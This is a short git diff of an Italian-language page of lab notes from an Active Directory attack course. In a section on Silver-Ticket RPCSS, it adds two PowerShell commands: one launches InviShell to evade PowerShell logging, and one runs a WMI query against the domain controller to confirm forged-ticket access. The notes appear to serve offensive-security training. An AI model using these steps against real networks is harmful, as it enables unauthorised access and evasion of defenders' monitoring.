@@ -115,12 +115,12 @@ Silver-Ticket RPCSS
 
 Dallo stesso prompt eseguiamo Invishell ed eseguiamo un comando WMI sul DC come student460
 
-```
-// Some code
+```powershell
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 ```
 
-```
-// Some code
+```powershell
+gwmi -Class win32_operatingsystem -ComputerName dcorp-dc
 ```
 
 <figure><img src="../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>
